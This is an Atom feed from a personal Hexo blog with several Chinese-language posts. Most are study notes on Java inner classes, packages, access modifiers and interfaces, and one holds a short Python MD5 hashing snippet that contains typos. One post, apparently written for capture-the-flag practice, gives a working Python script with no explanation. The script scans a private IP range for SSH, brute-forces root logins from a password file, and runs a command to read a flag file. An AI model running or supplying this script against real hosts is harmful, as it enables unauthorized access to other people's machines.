<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ather · Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://liuhaoan.github.io/"/>
  <updated>2019-04-08T08:44:43.115Z</updated>
  <id>http://liuhaoan.github.io/</id>
  
  <author>
    <name>Atcher</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javaSE复习之——面向对象_内部类</title>
    <link href="http://liuhaoan.github.io/2019/04/08/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/08/javaSE复习之——面向对象-内部类/</id>
    <published>2019-04-08T05:22:50.000Z</published>
    <updated>2019-04-08T08:44:43.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内部类的概述"><a href="#内部类的概述" class="headerlink" title="内部类的概述"></a>内部类的概述</h1><ul><li>内部类就是在一个类中定义的另一个类。<ul><li>ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在</li></ul></li></ul><h1 id="内部类的分类"><a href="#内部类的分类" class="headerlink" title="内部类的分类"></a>内部类的分类</h1><h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a><code>成员</code>内部类</h4><blockquote><p>它定义在一个<code>类</code>的内部</p></blockquote><h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a><code>局部</code>内部类</h4><blockquote><p>它定义在一个<code>方法</code>或者<code>一个作用域</code>内部，它的<code>访问仅限于</code>方法内或者该作用域内</p><p>注意事项：</p><p>局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的</p></blockquote><h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a><code>匿名</code>内部类</h4><blockquote><p>匿名内部类应该是平时我们编写代码时<code>用得最多的</code>，在编写<code>事件监听</code>的代码时使用匿名内部类不但方便，而且使代码更加<code>容易维护</code></p><p>例如：为按钮设置一个监听器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new OnClickListener() &#123;</span><br><span class="line">         </span><br><span class="line">        @Override</span><br><span class="line">        public void onClick(View v) &#123;</span><br><span class="line">            // TODO Auto-generated method stub</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a><code>静态</code>内部类</h4><blockquote><p>它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static</p></blockquote><h1 id="内部类的面试题之-——-内部类能不能访问外部类成员变量？"><a href="#内部类的面试题之-——-内部类能不能访问外部类成员变量？" class="headerlink" title="内部类的面试题之 —— 内部类能不能访问外部类成员变量？"></a>内部类的面试题之 —— <code>内部类</code>能不能访问<code>外部类</code>成员变量？</h1><ul><li><p>答（成员内部类）：</p><blockquote><p><code>内部类</code>可以访问<code>外部类</code>的成员变量，因为编译器底层在创建<code>成员内部类</code>时，为成员内部类加上了指向外部类的引用</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部类.this.成员变量</span><br><span class="line">外部类.this.成员方法</span><br></pre></td></tr></table></figure></blockquote></li><li><p>ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了</p></li><li>例子：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Circle &#123;</span><br><span class="line">    private double radius = 0;</span><br><span class="line"> </span><br><span class="line">    public Circle(double radius) &#123;</span><br><span class="line">        this.radius = radius;</span><br><span class="line">        getDrawInstance().drawSahpe();</span><br><span class="line">//必须先创建成员内部类的对象，再进行访问</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    private Draw getDrawInstance() &#123;</span><br><span class="line">        return new Draw();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    class Draw &#123;     //内部类</span><br><span class="line">        public void drawSahpe() &#123;</span><br><span class="line">            System.out.println(radius);</span><br><span class="line">//外部类的private成员</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="匿名内部类访问外部类成员底层实现原理："><a href="#匿名内部类访问外部类成员底层实现原理：" class="headerlink" title="匿名内部类访问外部类成员底层实现原理："></a><code>匿名内部类</code>访问外部类成员底层实现原理：</h1><blockquote><p>我们用一段代码来举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    public void test() &#123;</span><br><span class="line">        final int a = 10;</span><br><span class="line">        new Thread()&#123;</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                System.out.println(a);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>当test方法调用，系统会给内部类自动加上构造器<code>（这也就是为什么匿名内部类不能有构造方法的原因）</code>，这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。<code>这样就解决了生命周期的问题</code></p><p><code>但是还有一个数据不一致的问题</code>，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。</p><p>数据不一致问题的<code>解决方法</code>就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因</p></blockquote><ul><li>在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用<code>final</code>修饰</li><li>jdk8新特性<blockquote><p>局部内部类与匿名内部类访问外部类成员变量，外部类那个变量<code>不需要</code>final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。</p></blockquote></li></ul><h1 id="匿名内部类-1"><a href="#匿名内部类-1" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><ul><li>格式：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法</span><br><span class="line">new 类名或者抽象类名() &#123;</span><br><span class="line"></span><br><span class="line">&#125;.方法名（）</span><br><span class="line">//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法</span><br></pre></td></tr></table></figure><ul><li><p>解释：</p><blockquote><p>可以吧<code>new 到  }</code> 的代码看作创建的一个子类对象实例，所以后面可以<code>.方法名</code>调用</p></blockquote></li><li><p>好处：</p><blockquote><p>可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。</p></blockquote></li><li><p>注意事项：</p><blockquote><p>1、<code>匿名内部类</code>只针对重写<code>一个方法</code>使用，如果要一次性重写<code>多个方法</code>的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则<code>重新定义类</code>。</p><p>2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。</p><p>3、匿名内部类中不能定义构造函数。</p><p>4、使用匿名内部类时，我们必须是<code>继承一个类</code>或者<code>实现一个接口</code>，但是两者不可兼得，只能继承一个类或者实现一个接口。</p><p>5、匿名内部类中不能存在任何的静态成员变量和静态方法。</p><p>6、匿名内部类<code>属于</code>局部内部类，所以局部内部类<code>所有限制</code>都在匿名内部类上生效</p><p>7、匿名内部类不能是抽象的，它<code>必须实现</code>继承的类或者接口中的抽象方法</p></blockquote></li></ul><h1 id="链式编程："><a href="#链式编程：" class="headerlink" title="链式编程："></a>链式编程：</h1><ul><li>特点：<blockquote><p>调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内部类的概述&quot;&gt;&lt;a href=&quot;#内部类的概述&quot; class=&quot;headerlink&quot; title=&quot;内部类的概述&quot;&gt;&lt;/a&gt;内部类的概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;内部类就是在一个类中定义的另一个类。&lt;ul&gt;
&lt;li&gt;ps：刚开始学java对于内部类用到的着实
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="内部类" scheme="http://liuhaoan.github.io/tags/%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="匿名内部类" scheme="http://liuhaoan.github.io/tags/%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="链式编程" scheme="http://liuhaoan.github.io/tags/%E9%93%BE%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现MD5加密</title>
    <link href="http://liuhaoan.github.io/2019/04/08/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0MD5%E5%8A%A0%E5%AF%86/"/>
    <id>http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现MD5加密/</id>
    <published>2019-04-08T02:27:04.000Z</published>
    <updated>2019-04-08T11:01:25.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import hashilb</span><br><span class="line"></span><br><span class="line">str = input(“请输入要解密的字符串：”)</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">//创建MD5加密对象</span><br><span class="line"></span><br><span class="line">md5.update(str.encode(&quot;utf-8&quot;))</span><br><span class="line">//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密</span><br><span class="line"></span><br><span class="line">print(md5.hexdigest())</span><br><span class="line">//获取MD5加密后的16进制输出打印</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码示例：&quot;&gt;&lt;a href=&quot;#代码示例：&quot; class=&quot;headerlink&quot; title=&quot;代码示例：&quot;&gt;&lt;/a&gt;代码示例：&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="MD5加密" scheme="http://liuhaoan.github.io/tags/MD5%E5%8A%A0%E5%AF%86/"/>
    
      <category term="Python" scheme="http://liuhaoan.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现ssh端口扫描并爆破</title>
    <link href="http://liuhaoan.github.io/2019/04/08/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0ssh%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B9%B6%E7%88%86%E7%A0%B4/"/>
    <id>http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/</id>
    <published>2019-04-08T02:23:38.000Z</published>
    <updated>2019-04-08T11:01:22.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import threading</span><br><span class="line">import pexpect</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">key = [pexpect.TIMEOUT, &quot;#&quot;, &quot;\$&quot;, &quot;&gt;&quot;, &quot;&gt;&gt;&gt;&quot;, &quot;&amp;&quot;]</span><br><span class="line">loginKey = [pexpect.TIMEOUT, &quot;[p|P]assword&quot;, &quot;yes&quot;]</span><br><span class="line"></span><br><span class="line">def getFlag(p, ret):</span><br><span class="line">p.sendline(&quot;cat ../../../../flag&quot;)</span><br><span class="line">p.expect(key)</span><br><span class="line">ret += &quot;flag:\n&quot; + str(p.before)</span><br><span class="line">print(ret)</span><br><span class="line">file = open(&quot;flag.txt&quot;, &quot;a+&quot;)</span><br><span class="line">file.write(ret)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">def getPass(ip, passwd):</span><br><span class="line">p = pexpect.spawn(&quot;ssh root@&quot; + ip, timeout=1)</span><br><span class="line">try:</span><br><span class="line">b = p.expect(loginKey)</span><br><span class="line">if b == 1:</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">b = p.expect(key)</span><br><span class="line">if b &gt; 0:</span><br><span class="line">getFlag(p, ip + &quot;passwd:&quot; + passwd)</span><br><span class="line">return 1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">p.close()</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(ip):</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.settimeout(1)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">s.connect((ip, 22))</span><br><span class="line">b = True</span><br><span class="line">for n in open(&quot;passwd&quot;):</span><br><span class="line">passwd = n.strip();</span><br><span class="line">if getPass(ip, passwd) == 1:</span><br><span class="line">b = False</span><br><span class="line">break</span><br><span class="line">if b:</span><br><span class="line">file = open(&quot;ip.txt&quot;, &quot;a+&quot;)</span><br><span class="line">file.write(ip + &quot;\n&quot;)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for n in range(1, 255):</span><br><span class="line">for nn in range(1, 255):</span><br><span class="line">ip = &quot;192.168.&quot; + str(n) + &quot;.&quot; + str(nn)</span><br><span class="line">while True:</span><br><span class="line">if len(threading.enumerate()) &lt; 255:</span><br><span class="line">break</span><br><span class="line">threading.Thread(target=scan, args=(ip,)).start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="python" scheme="http://liuhaoan.github.io/tags/python/"/>
    
      <category term="ssh" scheme="http://liuhaoan.github.io/tags/ssh/"/>
    
      <category term="爆破" scheme="http://liuhaoan.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="端口扫描" scheme="http://liuhaoan.github.io/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_包与权限修饰符</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%8C%85%E4%B8%8E%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-包与权限修饰符/</id>
    <published>2019-04-07T09:55:53.000Z</published>
    <updated>2019-04-08T08:44:43.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="包的意义"><a href="#包的意义" class="headerlink" title="包的意义"></a>包的意义</h1><blockquote><p>我们以后开发程序都是把源码写在一个个的<code>源文件</code>里面，而不是<code>在一个文件中创建很多的类</code>，包的用处就在这里，说白了包就是为了封装。</p></blockquote><h1 id="定义包的格式"><a href="#定义包的格式" class="headerlink" title="定义包的格式"></a>定义包的格式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">package 包名;</span><br><span class="line">多级包用“.”分开</span><br></pre></td></tr></table></figure><ul><li><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package java.util.Scanner;</span><br></pre></td></tr></table></figure><p>  在这里当然也可以把<code>Scanner</code>用<code>*</code>代替，<code>*</code>就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为<em>需要遍历该包所有类。<br>  ps：在开发中一般都不使用</em>，而是导入<code>具体的类</code>。</p></li></ul><h1 id="定义时的注意事项"><a href="#定义时的注意事项" class="headerlink" title="定义时的注意事项"></a>定义时的注意事项</h1><blockquote><p>1、必须是程序的<code>第一条</code>可执行语句<br>2、<code>package</code>在一个java文件中<code>只能有一个</code><br>3、包名的格式为域名倒写</p><ul><li>例：com.aikan0.add<br>这个add就是这个包的作用。</li></ul></blockquote><h1 id="生成包命令"><a href="#生成包命令" class="headerlink" title="生成包命令"></a>生成包命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d  . 源文件名</span><br></pre></td></tr></table></figure><ul><li>ps：了解一下就好了</li></ul><h1 id="面试题——package、import、class有没有顺序关系？"><a href="#面试题——package、import、class有没有顺序关系？" class="headerlink" title="面试题——package、import、class有没有顺序关系？"></a>面试题——package、import、class有没有顺序关系？</h1><ul><li>解答：<blockquote><p>有，并且<code>package &gt; import &gt; class</code></p></blockquote></li></ul><h1 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h1><ul><li>四种权限修饰符</li></ul><table><thead><tr><th></th><th>本类</th><th>同一个包下(子类和无关类)</th><th>不同包下(子类)</th><th>不同包下(无关类)</th></tr></thead><tbody><tr><td>private</td><td>Y</td><td></td><td></td><td></td></tr><tr><td>默认</td><td>Y</td><td>Y</td><td></td><td></td></tr><tr><td>protected</td><td>Y</td><td>Y</td><td>Y</td><td></td></tr><tr><td>public</td><td>Y</td><td>Y</td><td>Y</td><td>Y </td></tr></tbody></table><blockquote><p>ps：<code>protected</code>表示受保护的，就是保护权限只给给自己的子类，一般不用在<code>变量</code>，而是用在<code>成员变量</code>或者<code>成员方法</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;包的意义&quot;&gt;&lt;a href=&quot;#包的意义&quot; class=&quot;headerlink&quot; title=&quot;包的意义&quot;&gt;&lt;/a&gt;包的意义&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;我们以后开发程序都是把源码写在一个个的&lt;code&gt;源文件&lt;/code&gt;里面，而不是&lt;code&gt;在一
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="包" scheme="http://liuhaoan.github.io/tags/%E5%8C%85/"/>
    
      <category term="权限修饰符" scheme="http://liuhaoan.github.io/tags/%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_接口</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8E%A5%E5%8F%A3/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-接口/</id>
    <published>2019-04-07T09:22:46.000Z</published>
    <updated>2019-04-08T08:44:43.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接口概述"><a href="#接口概述" class="headerlink" title="接口概述"></a>接口概述</h1><ul><li>从狭义的角度讲就是指java中的<code>interface</code></li><li>从广义的角度讲对<code>外提供规则</code>的都是接口 </li></ul><h1 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h1><ul><li>a : 接口用关键字<code>interface</code>表示    </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface 接口名 &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>b : 类实现接口用<code>implements</code>表示</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class 类名 implements 接口名 &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>c : 接口不能实例化<blockquote><p>那么，接口如何实例化呢?</p><p> 答：按照多态的方式来实例化。</p></blockquote></li></ul><ul><li><p>d : 接口的子类</p><blockquote><p>a : 可以是抽象类。但是意义不大。<br>b : 可以是具体类。要<code>重写接口中的所有抽象方法</code>。(推荐方案)</p></blockquote></li><li><p>注意事项：</p><blockquote><p>1、接口中的<code>成员变量</code>默认都是<code>常量</code>，他会自动加<code>public static final</code>关键字，并且可以互相交换位置，新手平时都手动给出。</p><p>2、接口中没有构造方法</p><p>3、接口是<code>干爹</code>，不是<code>亲爹</code>，子类<code>不能用super</code>访问父类中的内容，子类默认继承object类</p><p>4、接口中不能定义<code>非抽象</code>方法</p><p>5、类与接口是<code>实现</code>关系而非<code>继承</code>关系（干爹）</p><p>6、同一个类可以实现<code>多个</code>接口</p><ul><li>例子：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Deom implements InterA,InterB &#123;&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p>8、接口不能实现接口（implements），但是却可以继承（extends）</p></blockquote></li></ul><h1 id="类-与-接口的关系"><a href="#类-与-接口的关系" class="headerlink" title="类 与 接口的关系"></a>类 与 接口的关系</h1><ul><li>a : 类与类：<blockquote><p><code>继承关系</code>,只能单继承,可以多层继承。</p></blockquote></li></ul><ul><li>b : 类与接口：<blockquote><p><code>实现关系</code>,可以单实现,也可以多实现。<br>并且还可以在继承一个类的同时实现多个接口。</p></blockquote></li></ul><ul><li>c : 接口与接口：<blockquote><p><code>继承关系</code>,可以单继承,也可以多继承。</p></blockquote></li></ul><h1 id="抽象类-与-接口的区别："><a href="#抽象类-与-接口的区别：" class="headerlink" title="抽象类 与 接口的区别："></a>抽象类 与 接口的区别：</h1><ul><li>抽象类：<blockquote><p>和普通的类差不多，只是可以定义<code>抽象方法</code>而已</p></blockquote></li></ul><ul><li>接口：<blockquote><p>成员变量：只可以<code>常量</code><br>成员方法：只可以<code>抽象</code></p></blockquote></li></ul><h1 id="设计理念区别（重要）："><a href="#设计理念区别（重要）：" class="headerlink" title="设计理念区别（重要）："></a>设计理念区别（重要）：</h1><ul><li>抽象类：<blockquote><p>定义的是该继承体系的<code>共性功能</code></p><ul><li>例：每个学生都需要学习</li></ul></blockquote></li></ul><ul><li><p>接口：    定义的是该继承体系的<code>扩展性功能</code></p><blockquote><ul><li>例：每个学生在学校的学习方式都不一样，这样就需要扩展</li></ul></blockquote></li><li><p>设计理念区别：</p><blockquote><p>接口是<code>对动作的抽象</code>，抽象类是<code>对根源的抽象</code>。</p><p>抽象类表示的是：这个对象<code>是什么</code>。</p><p>接口表示的是：这个对象能<code>做什么</code>。</p><ul><li><p>比如：男人，女人，这两个类，他们的抽象类是人。<br>说明：他们都是人，他们的根源就是<code>人</code></p></li><li><p>又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。<br>说明：他们都可以吃东西，他们的根源是<code>不同</code>的，但是做的动作却<code>相同</code>的。</p></li></ul></blockquote></li></ul><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul><li>在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。</li><li>当关注一个<code>事物的本质</code>的时候，用<code>抽象类</code>；</li><li>当关注一个<code>要做的动作</code>的时候，用<code>接口</code>。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;接口概述&quot;&gt;&lt;a href=&quot;#接口概述&quot; class=&quot;headerlink&quot; title=&quot;接口概述&quot;&gt;&lt;/a&gt;接口概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;从狭义的角度讲就是指java中的&lt;code&gt;interface&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;从广义的角度讲对
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="接口" scheme="http://liuhaoan.github.io/tags/%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_抽象类</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-抽象类/</id>
    <published>2019-04-07T09:04:40.000Z</published>
    <updated>2019-04-08T08:44:43.116Z</updated>
    
